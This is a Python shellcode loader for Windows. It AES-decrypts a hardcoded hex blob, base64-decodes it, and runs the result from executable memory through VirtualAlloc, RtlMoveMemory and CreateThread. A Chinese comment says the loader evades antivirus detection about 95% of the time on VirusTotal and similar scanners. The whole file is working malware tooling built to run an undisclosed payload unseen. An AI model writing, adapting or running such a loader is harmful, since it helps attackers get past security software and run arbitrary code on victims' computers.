
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
import ctypes,base64

# 经微步在线，virustotal，virscan平台综合测试，免杀率大约为95%(测试时间2023年3月4日00:42:19)


# 解密后，去掉补足的空格用strip() 去掉
def decrypt(text):
    key = '9999999966666666'.encode('utf-8')
    iv = b'qqqqqqqqwwwwwwww'
    mode = AES.MODE_CBC
    cryptos = AES.new(key, mode, iv)
    plain_text = cryptos.decrypt(a2b_hex(text))
    code=bytes.decode(plain_text).rstrip('\0')
    return code

def zx(code):
    cd = base64.b64decode(code)
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    shangxian = ctypes.windll.kernel32.VirtualAlloc(0, len(cd), 0x1000, 0x40)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(shangxian), ctypes.create_string_buffer(cd), len(cd))
    handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(shangxian), 0, 0, 0)
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)

# code填入的值是由AES加密脚本输出的text的值
if __name__ == '__main__':
    code=b'014fd7d96a4582c7456a645b957eb8743a65cfa6487b249763fbb2e3940d6ce1a2448fa71fceca358ce89f3a033b1a1f3e6d446d602d339d3b24cbf7bdde5237aa73d42d63025fb38350c8517c9c7629e31caa2b5337c93b16769bfe101e4a1e93b4339d65ffd7403387a72019ec8aa34d43f80283d513eb9d1dd94b741d5a6ee515942e3f65982ccb04a9c0134d039855946ede811a276186e0bfda2fe1b0fdcf49eddb1f19004651bbb8857158088d1aa3441407efb214184a3485839c6f66f52b889f9b7e2d6bb8d6d4ef576590d1fe75eefdbf3ead3e6436fa3603302d3cab70ebc0ecd7250a345f7477ad80e9605bea8b365a841e9e4c874d0694fe95cc5c8b286a264b860cb22e0f3e9d4bc798211990eaf60bc483a760d49305bc2ead397ec1de458f675af44515a72f1a16e83a93c5c105e7bb5972c3c980566140f8aca8217fb8f4eef86352b81f48c74f94f05e71e1f9408b9a6ee6227367e554f2a930f10274104c57551d13e42ea74b14eef0baf190de0dac42ed919882e0af10602c3b4add95f59f49b9de773146e35aa93ad5777435284ae74cfff6a05f10e6811a6a207034ff5b3abaa767342483a85d773fbe98a720931a24c421b667f14dce38bf2a0cf499ccb00c8f7644863c2b5bc08799d216a74f7e421dc6c189d5ba4f398881a3845b49934b79c3a7595a569a719a5252964d279e0e944f6a6e89ee98fe5dd20d277d5f999eda4672d10d03669a24d5d4f1b2e595210c8e5a1c92e7cf035eee7d49be0ec85d5c3691c1beaba22968ca7497b870b8e5a455410d40b2c419afeaad3cb21ce8f5067441601d0a1ca5f5e806ddb137e2704fbcaad421883bd54972b665818bae7236a04dc1738e5ea429221a625ee573c4c3e047322ca5e5e24723c739d0b009236b341dcd48f99438b7dbbdab61d414888e64cd79d3b03ba5488bb1a63aec920463b3439a2a394f92209701dc3b7f4bfb001c4ce80eedf24b057ac28009a734f31dc874c73ba808620c9f07d6cd6d63ea1ec1dad8d8c797ae584ab544d879f057e542b983a221939883c877a2f4222d6ba492383125fc2945cba18e2a561a40417ba4c563bab851f54178b783285e0bfa3d2941104ccc6a523477b5253b0a4a74a49a8d6ed92f4906ce52a69a718dbf2bf45a064f15c2883d020bcad794819dac8300a2aff1f597a602638763902f4e65d2bf14eeb115e546ffd5294aaffca451748ac8f7064323c10c5c9845895cfc87a9f24dcc84b523a4cc14b02d1b474e8959f319f13037ea04f24342b3fbf0c658301bf677eba23236dced8dfd7163832ca90aebdd3fc085af9843b3f021e08f6ed905684c8fd85ba80162b3100611995e51faa9911b92290843c72b40e2cf4729942257948cdd381068af904827a31dd27dc91bc716afd7e5847271c97f1835a290a3d8f4c073bdebc41e33556c91a8401a20e67849059a8b175b77edb7ec605a2f76a137bc453dd28497e45545dada7f2368f17c4d8b2279a28b2884bf4c481651d3309651219759295caafe5fd1a387d8df16b6b5d3a306758eb46d3d5afac913ad60d4c0a4d106ce1864ad87d3f652c8f6ff6dd21d869afd13b8609b4a31a9a5bb7a14990a73cfb14d29401df1ab18e7b82b9c383f6044ca0ed4b8a93a9b9995fbb5b0bd147f1af7426dafe5fe0cddb9911366be0f'
    code=decrypt(code)
    zx(code)

